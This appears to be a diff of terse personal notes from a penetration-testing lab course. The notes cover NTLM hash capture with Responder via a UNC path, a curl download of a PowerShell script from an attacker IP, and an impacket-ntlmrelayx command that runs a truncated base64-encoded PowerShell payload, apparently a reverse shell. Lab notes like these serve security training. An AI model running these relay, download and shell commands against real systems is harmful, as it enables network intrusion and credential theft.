@@ -77,3 +77,12 @@ curl http://192.168.1.11:9090/exec.ps1 -o exec.ps1
 same as given in walkthrough
 use unc path for file upload after setting up responder
 //192.168.45.230/share/ack1.php
+
+### 15.3.4.1
+same as walkthrough 
+powershell encoding is tricky
+sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.221.212 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFM
+
+### 15.3.4.2
+
+same as above with command injection
